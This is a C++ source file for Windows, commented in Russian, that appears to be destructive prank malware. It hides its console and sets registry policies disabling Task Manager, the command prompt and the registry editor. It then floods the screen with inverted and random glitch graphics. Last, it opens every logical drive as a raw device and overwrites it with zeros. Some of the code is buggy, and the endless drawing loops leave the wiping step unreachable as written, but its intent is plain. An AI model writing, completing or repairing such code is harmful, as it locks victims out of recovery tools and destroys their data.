#include <windows.h>
#include <fstream>
#include <iostream>

void disable()
{
    HKEY taskMgrKey;
    RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &taskMgrKey);
    RegSetValueEx(taskMgrKey, "DisableTaskMgr", 0, REG_DWORD, (const BYTE*)"1", sizeof(DWORD));
    RegCloseKey(taskMgrKey);

    // Ключ реестра для блокировки командной строки
    HKEY cmdKey;
    RegOpenKey(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\System", &cmdKey);
    RegSetValueEx(cmdKey, "DisableCMD", 0, REG_DWORD, (const BYTE*)"1", sizeof(DWORD));
    RegCloseKey(cmdKey);

    // Ключ реестра для блокировки редактора реестра
    HKEY regeditKey;
    RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &regeditKey);
    RegSetValueEx(regeditKey, "DisableRegistryTools", 0, REG_DWORD, (const BYTE*)"1", sizeof(DWORD));
    RegCloseKey(regeditKey);
}

void invertScreen()
{
    HWND upWnd = GetForegroundWindow();
    HDC upHdc = GetDC(upWnd);
    HDC Desktop = GetDC(NULL);
    int xs = GetSystemMetrics(SM_CXSCREEN);
    int ys = GetSystemMetrics(SM_CYSCREEN);
    RECT* newRect;
    GetClientRect(GetDesktopWindow(), newRect);
    while (true)
    {
        InvertRect(Desktop, newRect);
        Sleep(0x000004);
    }

    ReleaseDC(upWnd, Desktop); 
}

void Glitch()
{
    HDC hdc = GetDC(NULL); // Получаем контекст устройства для всего экрана
    RECT rect;
    GetClientRect(GetDesktopWindow(), &rect); // Получаем размеры экрана

    // Создаем бесконечный цикл для непрерывного обновления изображения
    while (true) {
        // Случайным образом изменяем цвет и координаты прямоугольника
        int x = rand() % rect.right;
        int y = rand() % rect.bottom;
        int width = rand() % (rect.right - x);
        int height = rand() % (rect.bottom - y);
        COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);

        // Рисуем прямоугольник на экране с случайными параметрами
        HBRUSH brush = CreateSolidBrush(color);
        SelectObject(hdc, brush);
        Rectangle(hdc, x, y, x + width, y + height);
        DeleteObject(brush);

        // Задержка перед отрисовкой следующего глитча
        Sleep(100);
    }

    ReleaseDC(NULL, hdc); // Освобождаем контекст устройства
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    disable();
    invertScreen();
    Sleep(0x000004);
    Glitch();

     // Получаем список всех логических дисков на компьютере
    DWORD drivesMask = GetLogicalDrives();
    for (char drive = 'A'; drive <= 'Z'; ++drive) {
        if (drivesMask & (1 << (drive - 'A'))) {
            // Формируем путь к диску
            std::string diskPath = "\\\\.\\" + std::string(1, drive) + ":";

            // Открываем диск для записи
            std::ofstream disk(diskPath, std::ios::out | std::ios::binary);
            if (!disk) {
                continue; // Продолжаем с следующим диском
            }

            // Записываем нули на весь диск
            const int bufferSize = 1024 * 1024; // Размер буфера записи
            char buffer[bufferSize] = {0}; // Буфер с нулевыми байтами
            while (true) {
                disk.write(buffer, bufferSize);
                if (!disk) {
                    break; // Прерываем цикл записи на этом диске
                }
            }

            // Закрываем диск
            disk.close();
        }
    }

    return 0;
}